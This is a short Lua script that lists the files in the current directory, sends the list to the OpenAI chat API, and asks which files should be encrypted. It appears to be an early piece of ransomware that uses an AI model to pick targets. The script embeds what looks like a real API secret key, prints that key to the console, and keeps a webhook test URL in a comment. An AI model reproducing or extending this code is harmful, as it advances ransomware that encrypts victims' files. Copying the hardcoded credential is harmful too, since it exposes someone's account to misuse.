local https = require("https")
local json = require("json")
local fs = require("fs")

local token = "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"
-- https://webhook-test.com/afb78a10b106774462d159b79c0fab99

local files = fs.readdirSync(".")
print("THIS IS THE TEST VARIABLE: ", json.encode(files))

local requestData = {
    model = "gpt-3.5-turbo",
    messages = {
        {
            role = "user",
            content = "what files should be encrypted from this list? (provide output in json): " .. json.stringify(files)
        }
    }
}

local options = {
    hostname = "api.openai.com",
    port = 443, -- HTTPS port
    path = "/v1/chat/completions",
    method = "POST",
    headers = {
        ["Content-Type"] = "application/json",
        ["Authorization"] = "Bearer " .. token,
        ["Content-Length"] = #json.stringify(requestData)
    },
}

print(options.headers.Authorization .. " is the token provided!")

local req = https.request(options, function(res)
    local responseData = ""

    res:on("data", function(data)
        print("Data is coming!\n")
        responseData = responseData .. data
    end)

    res:on("end", function()
        print("End of request!")
        print(responseData)
    end)

    print("DATA NOW: " .. responseData)
end)

local jsonPayload = json.stringify(requestData)
print(#jsonPayload)

req:write(jsonPayload)
req:done()

req:on("error", function(error)
    print("Error provided: " .. error)
end)